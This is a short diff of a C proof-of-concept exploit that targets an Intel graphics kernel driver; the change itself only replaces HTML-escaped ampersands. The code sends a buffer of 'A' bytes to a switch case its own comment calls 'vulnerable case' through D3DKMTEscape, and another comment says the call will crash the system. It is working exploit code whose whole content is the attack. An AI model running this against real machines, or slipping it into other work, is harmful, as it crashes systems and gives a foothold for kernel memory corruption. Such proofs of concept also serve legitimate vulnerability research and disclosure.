@@ -84,7 +84,7 @@ int main()
 	DRIVER_INFO driverInfo = { 0 };
 	D3DKMT_ESCAPE escapeObj = { 0 };
 	PrivateDriverData data = { 0 };
-	int status = initDriver(&amp;driverInfo, intel);
+	int status = initDriver(&driverInfo, intel);
 	if (!NT_SUCCESS(status)) {
 		printf("Could not initialize connection to driver");
 		return -1;
@@ -99,9 +99,9 @@ int main()
 	data.switchcase_index = 205; // vulnerable case
 	memset(data.buffer, 'A', BUF_SIZE);
 
-	escapeObj.pPrivateDriverData = (void*)&amp;data;
+	escapeObj.pPrivateDriverData = (void*)&data;
 	escapeObj.PrivateDriverDataSize = sizeof(data);
-	status = D3DKMTEscape(&amp;escapeObj); // Will not return, it will crash the system.
+	status = D3DKMTEscape(&escapeObj); // Will not return, it will crash the system.
 	if (!NT_SUCCESS(status)) {
 		printf("[-] D3DKMTEscape failed (%x)", status);
 	}
